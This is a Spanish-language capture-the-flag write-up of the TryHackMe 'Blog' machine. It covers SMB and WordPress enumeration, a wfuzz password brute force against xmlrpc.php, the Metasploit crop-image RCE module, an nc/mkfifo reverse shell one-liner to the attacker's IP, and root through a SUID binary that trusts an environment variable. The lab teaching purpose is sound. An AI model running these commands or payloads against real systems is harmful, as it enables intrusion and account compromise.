---
title: "Blog - THM Writeup"
date: 2022-01-14T18:34:00-04:00
categories:
  - cajas
tags:
  - thm
  - wordpress
  - web
  - php
  - reversing
  - xml
  - metasploit
---

Hoy traemos la maquina `Blog` de [TryHackMe](https://tryhackme.com/room/blog) en donde segun su misma descripcion indica que esta usando el `Sistema de Gestion de Contenido (CMS)` muy conocido [WordPress](https://www.wordpress.com) el cual tambien tiene una lista extensa de vulnerabilidades pasadas, tambien vemos en sus propios objetivos se nos pide enumerar la version sobre este.

Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!
Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...
In order to get the blog to work with AWS, you'll need to add blog.thm to your /etc/hosts file.
{: .alert .alert-info}

Una vez logeados, procedemos a iniciar la maquina ~~y agregarle 1 hora mas por si acaso~~, luego nos conectamos al VPN con
> `sudo openvpn /PATHTO/USER.ovpn`{:.language-bash .highlight}

Con esto empezamos...

## RECONOCIMIENTO

Hacemos un `ping -c 1 IP`{:.language-bash .highlight} para analizar el `TTL` de la respuesta a ver si se aproxima a 64 (Linux) o a 128 (Windows), vemos en este caso que es Linux.

Escaneamos los puertos abiertos con la herramienta `nmap`{:.language-bash .highlight} usando opciones que nos aumentaran en cierta medida la velocidad de escaneo:
> `nmap -p- -sS --open --min-rate=600 -vvv -n -Pn -oN puertos.txt 10.10.193.129`{:.language-bash .highlight}
![image](https://user-images.githubusercontent.com/85322110/149607176-3a61b846-19cb-4b52-9bf5-671b9b17b0e2.png)

Con esto vemos **todos** los puertos TCP `-p-`, utilizamos un escaneo del tipo [TCP SYN Scan](https://nmap.org/book/synscan.html), usamos solo listar puertos `--open`, aumentamos la cantidad minima de paquetes a enviar por segundo con `--min-rate=600` con rango entre `100-5000` dependiendo de la conexion existente, con maxima verbosidad `-vvv`, sin resolucion DNS `-n`, desactivando el [Host Discovery](https://nmap.org/book/man-host-discovery.html) con `-Pn` y guardando un archivo `-oN puertos.txt`

Lanzamos scripts basicos de enumeracion con `-sC` y deteccion de version `-sV` para los puertos que se encontraron abiertos, con salida al archivo `version.txt`.
> `nmap -sC -sV 10.10.193.129 -oN version.txt`{:.language-bash .highlight}
![image](https://user-images.githubusercontent.com/85322110/149606626-f6676da6-2236-407a-8bc5-9ace7b3eaf6a.png)


Encontramos un puerto `ssh 22` con el que no podremos hacer mucho si no tenemos credenciales de acceso, un puerto `http 80` utilizando el `CMS` con su version y con esto podriamos responder los primeros objetivos de la maquina, y tambien un servicio `smb 139,445` que al parecer podemos acceder como invitado.

Empezaremos con este puerto `smb` haciendo un listado de los recursos compartidos por red con `smbclient -L 10.10.56.100 -N`{:.language-bash .highlight} para listar con `-L` y elegir no usar clave de acceso con `-N`
![image](https://user-images.githubusercontent.com/85322110/149606629-10a31a7f-3cdd-4fba-8547-e8bfedda6bc7.png)

Vemos un recurso llamado `BillySMB` que es sospechoso segun la descripcion de la maquina, asi que procedemos a abrirlo y copiarnos todo el contenido:
![image](https://user-images.githubusercontent.com/85322110/149606632-81d12e14-f355-4760-a59b-49bc02fe10c3.png)

Usamos `prompt` para evitar preguntar confirmacion y nos copiamos todo con `mget *` ~~multiget?~~

A partir de ahi revisamos los archivos pero no encontramos mucho. Al usar `steghide` vemos que en la imagen `Alice-White-Rabbit.jpg` existe informacion pero al extraerla nos topamos con un buen `rabbit hole` que se advertia desde un principio...
![image](https://user-images.githubusercontent.com/85322110/149606634-742294c9-e654-451e-a9da-dcfd2ce9423b.png)

Asi que al no ver nada interesante, nos centramos en la pagina web, al abrirla vemos un Blog en Wordpress comun, con un par de publicaciones, de las cuales si vemos los autores tenemos dos posibles usuarios de la pagina que son `bjoel,kwheel`, intentamos logearnos con claves por defecto en el apartado de `Login` que encontramos en el sitio pero no logramos entrar.

Podriamos intentar hacer `fuzzing` para encontrar rutas y archivos de la pagina, sin embargo notamos un problema de conexion al mandar muchos paquetes, asi que podemos ir manualmente [enumerando](https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress) un poco el WordPress.

Podemos validar si existen mas usuarios posibles usando una ruta tipica de WordPress en `/wp-json/wp/v2/users`, aca encontramos efectivamente un texto en formato JSON con cierta informacion: 
![image](https://user-images.githubusercontent.com/85322110/149642926-7293d7f9-da77-4ffe-b0cf-2cbffc322194.png)

Podemos hacer uso de la herramienta `jq` con la cual si pasamos un `echo 'TEXTOJSON' | jq ".[] | .slug" | tr -d '"'`{:.language-bash .highlight} podemos obtener el campo `slug` del formato JSON y verificamos que solo existen los usuarios `bjoel,kwheel` que identificamos antes.  

Seguimos enumerando y encontramos que efectivamente existe el archivo `/xmlrpc.php` debido a que si hacemos peticion usando `burpsuite` o `curl` obtenemos respuesta positiva desde el lado del servidor, aunque pone lo siguiente:

> XML-RPC server accepts POST requests only. 

Pues lo unico que debemos hacer aca para poder [enumerar](https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#xml-rpc) ciertas cosas con esta API, podemos hacer uso de `burpsuite` donde activamos el proxy, interceptamos una actualizacion de esta pagina, nos mandamos la peticion a la opcion `Repeater`, damos `2do Click` y usamos `Change request Method` para cambiar la peticion a `POST`, y luego ya solo queda modificar el cuerpo de la peticion, por ejemplo podemos mostrar los metodos disponibles a llamar con:
```xml
<methodCall>
 <methodName>
  system.listMethods
 </methodName>
</methodCall>
```
![image](https://user-images.githubusercontent.com/85322110/149643483-90ecadf0-518d-40e9-bb11-93d92cedbda0.png)

## ESCANEO

Vemos de ultimo en la lista que tenemos disponible el metodo `wp.getUsersBlogs` con el cual podremos utilizarlo para probar por fuera bruta `bruteforce` las claves de estos dos usuarios que nos encontramos. Para esto existen diferentes maneras, tenemos `burpsuite` que con licencia pro hace funcion de `Intruder` por hilos, tenemos `wpscan` que tambien tiene un modulo de fuerza bruta, tambien podriamos hacer uso de herramientas de fuzzing como `wfuzz`, o incluso desde un script en `bash` usando el paquete `curl`, sin embargo vemos que esta maquina es altamente susceptible a DoS si se envian muchas peticiones, asi que en este caso tiraremos de `wfuzz` sin agregar muchos hilos usando lo siguiente:

> La peticion que se debe enviar para probar una clave es esta

```xml
<methodCall>
 <methodName>
  wp.getUsersBlogs
 </methodName>
  <params>
   <param>
    <value>
     user
    </value>
   </param>
   <param>
    <value>
     password
    </value>
   </param>
  </params>	
</methodCall>
```
 
Como usuarios, tenemos que crear un archivo que en cada linea tenga un usuario para `bjoel, kwheel` en un archivo users.txt y como claves usaremos las primeras 5000 claves del archivo rockyou.txt las cuales extraemos con `head -n 5000 /usr/share/wordlists/rockyou.txt > dict.txt`{:.language-bash .highlight} y una vez tengamos esto usaremos la siguiente instruccion para `wfuzz`

```bash
wfuzz -c --hh=403 -w dict.txt -w users.txt -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>FUZ2Z</value></param><param><value>FUZZ</value></param></params></methodCall>" http://blog.thm/xmlrpc.php
```

Con esto usaremos formato `-c`olorizado, escondemos las respuestas con 403 caracteres (si se quita este comando, apareceran todas las solicitudes con claves incorrectas, usamos este filtro para eliminar esas respuestas especificas), usamos el diccionario `-w` dict.txt de primero para iterar 1 clave con dos usuarios, y luego el diccionario de `-w` users.txt, si lo ponemos en orden inverso pues iteraria 1 usuario con todas las claves, y nosotros queremos probar cada clave con cada usuario para agilizar tiempo, luego con `-d` pasamos la `POST data` de la peticion `xml` en una sola linea, poniendo `FUZ2Z` donde irian nuestro `user.txt`, y ponemos `FUZZ` donde irian las claves, y finalmente la URL de peticion, con esto encontramos la clave para `kwheel`:
![image](https://user-images.githubusercontent.com/85322110/149839157-21e5e57e-1f71-4c3b-a32e-896cd9be8886.png)

Una vez tenemos esta clave, podemos probar logearnos en la misma pagina, pero vemos que no tenemos permisos de administrador asi que no podremos hacer mucho, sin embargo existen `exploits` que requieren de autenticacion inicial para funcionar, por ello vemos si existe algun exploit para la version actual de wordpress con `searchsploit wordpress 5.0`{:.language-bash .highlight} y vemos ciertos exploits, pero en este caso nos enfocaremos en el llamado `WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)` que es el que aparenta estar operativo. Al ser de Metasploit debemos lanzar el entorno del mismo con `msfconsole` y esperamos que se active la consola ~~con mucha paciencia~~.

Una vez aca podemos buscar el mismo exploit con `search wordpress 5.0` y anotamos el nombre, enviamos `use exploit/multi/http/wp_crop_rce` y luego debemos completar las opciones del `exploit` con `options`, a partir de ahi seteamos el `LHOST, LPORT, RHOSTS, USERNAME y PASSWORD` con `set LHOST 10.8.33.130` por ejemplo:
![image](https://user-images.githubusercontent.com/85322110/149840797-37e94b55-43f6-4043-8776-7499c62507d9.png)
![image](https://user-images.githubusercontent.com/85322110/149840827-0f2f5912-a4b5-4422-abd1-5031da93367a.png)

Ya con todo configurado, procemos a escribir `exploit` y darle enter:
![image](https://user-images.githubusercontent.com/85322110/149841372-018ac92e-fa7e-4dc7-aadc-4fc592120d7f.png)

Aca ya tenemos ejecucion de comandos de manera remota con el servidor y logramos el acceso inicial, seguimos con la siguiente fase...

## ESCALADA DE PRIVILEGIOS

Hemos obtenido acceso con una consola del tipo `meterpreter`, pero a modo de comodidad pasamos a crearnos una `reverse shell` con `nc` como estamos acostumbramos, para ello escribimos `shell` en meterpreter para ejecutar una consola de sistema operativo, luego nos ponemos en escucha por otra ventana de `bash` con `sudo nc -nvlp 443` y desde la consola del sistema remoto usamos el siguiente [metodo de reverse shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
> `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.33.130 443 >/tmp/f`{:.language-bash .highlight}

Una vez obtenemos esta consola remota de bash, lo primero que podemos hacer es obtener una consola mas interactiva haciendo uso de una serie de pasos que se explican a continuacion:

- `script /dev/null -c bash`{:.language-bash .highlight}
- En teclado `Ctrl + Z`
- `stty raw -echo; fg`{:.language-bash .highlight}
- Escribir `reset` aunque no se vea
- `xterm` en Terminal Type
- `export SHELL=bash`{:.language-bash .highlight}
- `export TERM=xterm`{:.language-bash .highlight}

Ya con esto tenemos una consola interactiva con la cual procedemos a seguir investigando en como ganar privilegios de `root`.

Podemos intentar obtener la flag de `user.txt` que la encontramos en `/home/bjoel/user.txt` pero nos topamos con que es una burla y no se encuentra alli, vemos un archivo PDF que es una carta de despido para Billy indicando que usaba dispositivos USB lo cual no estaba permitido en esa empresa.

Si seguimos buscando formas de obtener credenciales elevadas, al usar `find / -perm -4000 2>/dev/null` para ver los binarios con [SUID](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/), notamos que hay uno que sobresale de la lista, pues esta en una carpeta donde no hay otros binarios SUID, en `/usr/sbin/checker`, al ejecutarlo solo nos dice que somos admin, pero si usamos `ltrace` para ejecutarlo vemos que hace uso de la funcion `getenv()` lo cual intenta buscar una variable de entorno llamada `admin`:
![image](https://user-images.githubusercontent.com/85322110/149843382-9b1cb980-3c61-4011-b67e-6309364318b3.png)

Probamos hacer `export admin='test'` y ejecutamos el binario de nuevo y efectivamente ya tenemos acceso root, de aca buscamos donde esta la flag `user.txt` y leemos la flag de `root.txt` y concluimos con esta maquina:
![image](https://user-images.githubusercontent.com/85322110/149843391-7b9296e8-5b65-4b39-890a-680209ef1dd8.png)

Saludos!
